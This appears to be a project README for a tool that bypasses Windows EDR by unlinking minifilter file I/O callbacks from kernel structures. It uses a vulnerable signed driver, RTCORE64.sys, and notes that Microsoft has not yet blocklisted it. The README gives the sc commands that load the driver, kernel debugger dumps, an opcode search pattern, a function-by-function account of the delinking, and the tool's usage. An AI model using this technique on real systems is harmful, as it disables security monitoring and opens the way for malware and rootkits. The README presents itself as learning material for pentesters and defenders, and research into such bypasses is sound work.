# EDR bypass through minifilters callbacks delinking

MCP-PoC is a project that was developed 3 years ago for patching Callbacks related to File I/O operations by [MCP-PoC](https://github.com/alfarom256/MCP-PoC) that doesn't work anymore, so i decided to dig up and do some research to fix it.

## Warning

Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**

## Major Updates

Three major changes have been made to the original exploit:

- Updated the exploit to work with `RTCORE64.sys` instead of `dbutil_2_3.sys` because `dbutil_2_3.sys` is now blacklisted by MICROSOFT.

- Instead of patching the callbacks (which doesn't work anymore, as the calls are verified by KCFG), I used a different technique that attackers are using nowadays which is delinking (removing the link).

- Added Restore functionnality

## Load and run the vulnerable driver

Needs to run from an admin console, or you can use the build in commands in the tool.

<pre>
sc create VulnerableDriver binPath= C:\Users\Vixx\Desktop\RTCORE64.sys type= kernel
sc start VulnerableDriver
</pre>

**As the driver is not yet blocklisted by MICROSOFT, IT IS STILL POSSIBLE TO LOAD IT WITHOUT ANY ISSUE**

## Prerequisistes

This code is based on the original blog post: [Minifilter Callback Patching Proof-of-Concept](https://github.com/alfarom256/MCP-PoC)

This is an advanced topic requiring the following prerequisites:

- Assembly understanding

- Familiarity with C programming

- Experience with WinDbg

- Familiarity with IDA

- Windows kernel exploitation knowledge.

## Tools Used

WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)

## Kernel Debugging Setup

To debug your local kernel (for fixing your offsets and reversing), follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)

## Target Audience

This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.

## Purpose

Tools exist already for example [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) which is great that will do this and calculate offsets automaticaly, but this is designed to be small and on point for multiple reasons:

- For everyone to be able to learn how technically bypassing EDR (File Filters Callbacks) is done.
- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
- For researchers to be able to play around the code and debug and reverse and maybe find something new.

## Attacker Abuse Cases

An attacker with administrative privileges may attempt to disable EDR or install a rootkit. To interact with the kernel, a signed Microsoft driver is required. Since unsigned drivers cannot be loaded with Microsoft mitigations enabled (e.g., VBS, Hyper-V), attackers typically exploit vulnerable signed drivers that have not been blacklisted.

**FileCallbackKernelBypass project updated to use RTCORE64.sys driver which is not yet blocklisted by MICROSOFT**

## Introduction to File Filters Callbacks

EDR And AV solutions can as well set up callbacks for file I/O operations.

File system minifilters are drivers which are used to inspect, log, modify, or prevent file I/O operations. The filter manager driver (FltMgr.sys) effectively "sits in-between" the I/O Manager and the File System Driver, and is responsible for registration of file system minifilter drivers, and the invocation of their pre and post-operation callbacks. Such callbacks are provided by the minifilter, and are to be invoked before or after the I/O operation.

## How does it work

I am going over each function (in the c code) and explain what is does so you can make sense of the code yourself.

### Resolve FltEnumerateFilters And get FLTMGR!FltGlobals Address

First step in the C code is to get the `FLTMGR!FltGlobals` global variable address.

We can get this address through a binary search using the following exported function `FLTMGR!FltEnumerateFilters`

<pre>
FLTMGR!FltEnumerateFilters+0x81:
fffff800`350c90e1 e87a59316e      call    nt!ExInitializeFastOwnerEntry (fffff800`a33dea60)
fffff800`350c90e6 4c8b157310fdff  mov     r10,qword ptr [FLTMGR!_imp_KeEnterCriticalRegion (fffff800`3509a160)]
fffff800`350c90ed e8fe23326e      call    nt!KeEnterCriticalRegion (fffff800`a33eb4f0)
fffff800`350c90f2 41b001          mov     r8b,1
fffff800`350c90f5 488d942480000000 lea     rdx,[rsp+80h]
<mark>fffff800`350c90fd 488d0d9476fcff  lea     rcx,[FLTMGR!FltGlobals+0x58 (fffff800`35090798)]</mark>
fffff800`350c9104 4c8b154d10fdff  mov     r10,qword ptr [FLTMGR!_imp_ExAcquireFastResourceShared (fffff800`3509a158)]
fffff800`350c910b e820da146e      call    nt!ExAcquireFastResourceShared (fffff800`a3216b30)
</pre>

<pre>
const uint8_t patternFltGlobals[] = { 0x48, 0x8d, 0x0d, 0x58 };
</pre>

So the function `ResolveFltmgrGlobals` will resolve the address of `FLTMGR!FltGlobals` by loading `FLTMGR.sys` to the usermode process and using a binary search, by searching for `lea rcx` opcodes and calculate the offset of `FLTMGR!FltGlobals` and use that on the real driver base address of `FLTMGR.sys` to get the kernel address of `FLTMGR!FltGlobals` .

**Note:** we need to subtract 0x58 from the address we will get because as you can see from the snipped above, what we will get is `FLTMGR!FltGlobals+0x58`.

### GetFilterByName Function

Next step is to get the frame, in latest versions of windows only 1 Frame exist.

The frame will contains all the registered filters.

<pre>
lkd> x FLTMGR!FltGlobals
<mark>fffff800`35090740 FLTMGR!FltGlobals = <no type information></mark>
lkd> dt FLTMGR!_GLOBALS fffff800`35090740
   +0x000 DebugFlags       : 0
   +0x008 DebugTraceFlags  : 0
   +0x010 GFlags           : 0x143
   +0x018 RegHandle        : 0xffffa801`6c1fce10
   +0x020 NumProcessors    : 6
   +0x024 CacheLineSize    : 0x40
   +0x028 AlignedInstanceTrackingListSize : 0x40
   +0x030 ControlDeviceObject : 0xffffa801`6c077900 _DEVICE_OBJECT
   +0x038 DriverObject     : 0xffffa801`6c0776e0 _DRIVER_OBJECT
   +0x040 KtmTransactionManagerHandle : 0xffffffff`800001fc Void
   +0x048 TxVolKtmResourceManagerHandle : (null) 
   +0x050 TxVolKtmResourceManager : (null) 
   <mark>+0x058 FrameList        : _FLT_RESOURCE_LIST_HEAD
                                    [+0x068] rList [Type: _LIST_ENTRY]</mark>
lkd> dqs fffff800`35090740 + 0x058 + 0x068 L2
fffff800`35090800  ffffa801`6c078248
fffff800`35090808  ffffa801`6c078248
</pre>

As you can see `rList` contains the frames, and only one frame exists `ffffa8016c078248`

Next step is to get the filters from the frame.

First we need to subtract 0x08 from `ffffa8016c078248` to get to the the start of the frame structure `FLTMGR!_FLTP_FRAME`

<pre>
dt FLTMGR!_FLTP_FRAME 0xffffa8016c078240
    +0x008 Links : _LIST_ENTRY [ 0xfffff800`35090800 - 0xfffff800`35090800 ]
	+0x048 RegisteredFilters : _FLT_RESOURCE_LIST_HEAD
		<mark>[+0x068] rList            [Type: _LIST_ENTRY]</mark>
		[+0x078] rCount           : 0xc [Type: unsigned long]
</pre>

And so the c code will loop through each filter and compare the name of the filter with the one we want.

<pre>
lkd> dqs 0xffffa8016c078240 + 0x048 + 0x068 L2
ffffa801`6c0782f0  <mark>ffffa801`6e76a020</mark>
ffffa801`6c0782f8  ffffa801`6c089530
</pre>

We need to substract 0x10 from the address that we will use from the link list `ffffa8016e76a020` => to get to the base address of the filter structure `_FLT_FILTER`

<pre>
dt _FLT_FILTER <mark>ffffa801`6e76a010</mark>
	+0x038 Name             : _UNICODE_STRING "bindflt"
		[+0x000] Length           : 0xe [Type: unsigned short]
		[+0x002] MaximumLength    : 0xe [Type: unsigned short]
		[+0x008] Buffer           : 0xffffe606b29b3848 : "bindflt" [Type: wchar_t *]
</pre>

And you can see the name of this filter is `bindflt`

If one of the filter is the one we are interested in, the function returns the filter structure pointer `ffffa8016e76a010`

**Providing an non existant filter as input will show you all the filters ^^**

### GetFrameForFilter Function

This will return the frame structure pointer of the filter we chose.

<pre>
lkd> dt _FLT_FILTER ffffa801`6e76a010
    <mark>+0x030 Frame            : 0xffffa801`6c078240 _FLTP_FRAME</mark>
</pre>

The function will return `0xffffa8016c078240`

###  GetOperationsForFilter Function

Each Filter will contains a operations list which is associated to a pre and post operation.

so Each Filtter will be associated to a pre and post callback funtion that will be called on I/O file operation related to that filter.

The purpose of this function is to gather all the pre and post operations of that filter we chose.

<pre>
dt _FLT_FILTER ffffa801`6e76a010
	   <mark>+0x1a8 Operations       : 0xffffa801`6e76a2d0 _FLT_OPERATION_REGISTRATION</mark>
</pre>

Next let's dump the operations structure `_FLT_OPERATION_REGISTRATION`

<pre>
dt FLTMGR!_FLT_OPERATION_REGISTRATION 0xffffa801`6e76a2d0
   <mark>+0x000 MajorFunction    : 0 ''</mark>
   +0x004 Flags            : 0
   <mark>+0x008 PreOperation     : 0xfffff800`39fd7830     _FLT_PREOP_CALLBACK_STATUS  bindflt!BfPreCreate+0
   +0x010 PostOperation    : 0xfffff800`39fcf3b0     _FLT_POSTOP_CALLBACK_STATUS  bindflt!BfPostCreate+0</mark>
   +0x018 Reserved1        : (null) 
</pre>

The function will add Each operation to the list and go to the next one by adding the size of the operation structure (FLTMGR!_FLT_OPERATION_REGISTRATION)

so eventually the function will return a list containing all operations (pre and post) related to the filter we picked.

### EnumFrameVolumes Function

Each Frame is attached as well to volumes. you can consider a volume as a device name.

File Filters can be setup in a way to only be active and monitor I/O operations on a specific volume.

<pre>
dt FLTMGR!_FLTP_FRAME 0xffffa8016c078240
		<mark>+0x0c8 AttachedVolumes  : _FLT_RESOURCE_LIST_HEAD</mark>
			    [+0x000] rLock            : Unowned Resource [Type: _ERESOURCE]
				[+0x068] rList            [Type: _LIST_ENTRY]
				[+0x078] rCount           : 0x7 [Type: unsigned long]
</pre>

`rCount` => contains the numbers of volumes

Next the function will Loop through the `rList` list entries to get the volume structure pointers.

<pre>
lkd> dqs 0xffffa8016c078240 + 0x0c8 + 0x068 L2
ffffa801`6c078370  <mark>ffffa801`6c427050</mark>
ffffa801`6c078378  ffffa801`6df8d020
</pre>

Needs to subtract 10 from the address of the volume we get to reach the start of the volume structure `FLTMGR!_FLT_VOLUME`, for example `ffffa8016c427050 - 0x10`

<pre>
dt FLTMGR!_FLT_VOLUME ffffa801`6c427040
	+0x070 DeviceName       : _UNICODE_STRING "\Device\Mup"
		    [+0x000] Length           : 0x16 [Type: unsigned short]
			[+0x002] MaximumLength    : 0x16 [Type: unsigned short]
			[+0x008] Buffer           : 0xffffb58920da186c : "\Device\Mup" [Type: wchar_t *]
</pre>

The function will read the string length first and then the buffer which is the actual device name

The function will return a map => retVal[devicename] = (PVOID)lpVolume (pointer to the volume structure) for each volume.

### UnLinksForVolumesAndCallbacks Function

Each Volume will contains a list of callbacks, indexed by their Major Function + 22.

<pre>
dt FLTMGR!_FLT_VOLUME ffffa801`6c427040
	<mark>+0x140 Callbacks        : _CALLBACK_CTRL
	    [+0x000] OperationLists   [Type: _LIST_ENTRY [50]]</mark>
		[+0x320] OperationFlags   [Type: _CALLBACK_NODE_FLAGS [50]
</pre>

Each callback node (operation) contains a pre and post operation like in the filter.

Each one of the entries (there is 50) in the OperationLists are callbacks (pre/post operation) based on the major function index (of the filter callback) + 22

<pre>
lkd> dq ffffa801`6c427040 + 0x140 L1
ffffa801`6c427180  ffffc20e`bfc9a7d0
dt FLTMGR!_CALLBACK_NODE ffffc20e`bfc9a7d0
   +0x000 CallbackLinks    : _LIST_ENTRY
   +0x010 Instance         : Ptr64 _FLT_INSTANCE
   <mark>+0x018 PreOperation     : Ptr64     _FLT_PREOP_CALLBACK_STATUS 
   +0x020 PostOperation    : Ptr64     _FLT_POSTOP_CALLBACK_STATUS </mark>
   +0x018 GenerateFileName : Ptr64     long 
   +0x018 NormalizeNameComponent : Ptr64     long 
   +0x018 NormalizeNameComponentEx : Ptr64     long 
   +0x020 NormalizeContextCleanup : Ptr64     void 
   +0x028 Flags            : _CALLBACK_NODE_FLAGS
</pre>

As I said previously, Each one of the entries in the OperationLists are callbacks (pre/post operation) based on the major function index + 22

What it means is the major function of each operation we found in the filter in the function `GetOperationsForFilter` is associated to the callback at index (major function + 22) in the `OperationLists` in the volume structure.

So MAJORFUNCTION[0] (in the filter structure) = 22 (in the operationlists in the volume structure)

What the function will do is the following:
- Loop through the operations we got from the filters (from `GetOperationsForFilter`) First.
- Inside the first loop, Loop through the Volumes.
- Get the operation Entry (within the OperationLists of the volume structure) Based on the `Major Function (from the operation in step 1) + 22`.
The operation entry will contains all the callbacks that are setup for this volume
- Loop throught the CallbackLinks of the operationLists Entry we are in.
- Check if any of the pre / post callback entries (inside the operation) match the one from the filter operation (step 1).
- If so we remove the whole link from the linked list inside the operation (volume structure).

### Reference
https://github.com/alfarom256/MCP-PoC

## usage
Load and run the vulnerable Driver as administrator

<pre>
sc create VulnerableDriver binPath= C:\Users\Vixx\Desktop\RTCORE64.sys type= kernel
sc start VulnerableDriver
</pre>

Run the exe as administrator

<pre>
PS C:\Users\Vixx\Desktop\Tools\MiniFilterFileCallbackKernelBypass\x64\Release> .\MiniFilterFileCallbackernelBypass.exe
Usage: C:\Users\Vixx\Desktop\Tools\MiniFilterFileCallbackKernelBypass\x64\Release\MiniFilterFileCallbackernelBypass.exe
 /filtersshow <filtername> - List Filters or Major Function for a filter
 /filterlinks <filtername> - Remove Filters related to that driver
 /installDriver - Install the MSI driver
 /uninstallDriver - Uninstall the MSI driver
</pre>

Not Providing a filter, will output all filters to pick from.

### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.
